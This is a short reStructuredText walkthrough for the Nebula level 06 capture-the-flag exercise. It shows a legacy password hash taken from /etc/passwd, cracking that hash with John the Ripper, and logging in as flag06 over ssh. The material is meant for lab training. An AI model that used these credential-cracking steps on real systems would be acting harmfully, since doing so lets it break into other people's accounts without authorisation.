.. _nebula6:

.. role:: bash(code)
	  :language: bash

Nebula 6
========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level06/

Solution
--------

Check the file :bash:`/etc/passwd`

Then use the program John the Ripper like this

.. code-block:: bash

    echo 'flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh' > /root/flag06
    john /root/flag06
    ssh flag06@localhost
.. note::

   Password is the one John gives you

   :bash:`getflag`
